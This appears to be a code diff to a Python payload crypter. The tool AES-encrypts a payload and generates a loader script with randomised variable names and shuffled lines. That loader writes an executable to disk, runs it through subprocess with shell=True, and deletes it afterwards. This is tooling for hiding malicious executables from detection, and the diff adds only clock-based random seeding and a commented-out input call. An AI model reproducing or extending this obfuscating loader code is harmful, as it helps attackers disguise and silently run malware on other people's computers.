@@ -4,6 +4,7 @@ import base64
 import subprocess
 import os
 import shutil
+import time
 
 from Cryptodome.Cipher import AES
 from typing_extensions import Annotated
@@ -39,6 +40,8 @@ def encrypt_payload(payload_path: str, save_path: str) -> bool | None:
     cipher = AES.new(key, AES.MODE_CBC)
     padded_payload = payload + ("\n" * ((16 - len(payload)) % 16))
     encrypted_payload = cipher.encrypt(padded_payload.encode())
+
+    np.random.seed(int(time.time()))
 
     try:
         with open(save_path, "w") as f:
@@ -88,6 +91,8 @@ def compile_and_encrypt_payload(payload_path: str, save_path: str):
     padded_payload = payload + (b"0" * ((16 - len(payload)) % 16))
     encrypted_payload = cipher.encrypt(padded_payload)
 
+    np.random.seed(int(time.time()))
+
     try:
         with open(save_path, "w") as f:
             header_lines = ["import base64"]
@@ -106,6 +111,7 @@ def compile_and_encrypt_payload(payload_path: str, save_path: str):
                 f"{variables[5]}.write({variables[4]})",
                 f"{variables[5]}.close()",
                 f"subprocess.run([r'{variables[6]}.exe'], shell=True)",
+                #f"input()",
                 f"os.remove(r'{variables[6]}.exe')",
             ]
             np.random.shuffle(lines)
